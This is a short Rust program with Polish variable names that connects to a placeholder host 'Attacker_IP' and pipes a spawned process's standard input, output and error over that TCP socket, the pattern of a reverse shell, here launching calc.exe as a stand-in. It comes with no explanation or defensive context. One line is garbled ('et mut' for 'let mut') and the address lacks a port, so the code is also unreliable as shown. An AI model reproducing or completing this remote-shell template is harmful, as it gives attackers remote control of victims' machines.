rust

use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() {
    let adres = "Attacker_IP";

    if let Ok(strumien) = TcpStream::connect(adres) {
        let wejscie = Stdio::from(strumien.try_clone().unwrap());
        let wyjscie = Stdio::from(strumien.try_clone().unwrap());
        let bledy = Stdio::from(strumien);
         et mut proces = Command::new("calc.exe")  
            .stdin(wejscie)
            .stdout(wyjscie)
            .stderr(bledy)
            .spawn()
            .unwrap();

        proces.wait().unwrap();
    }
}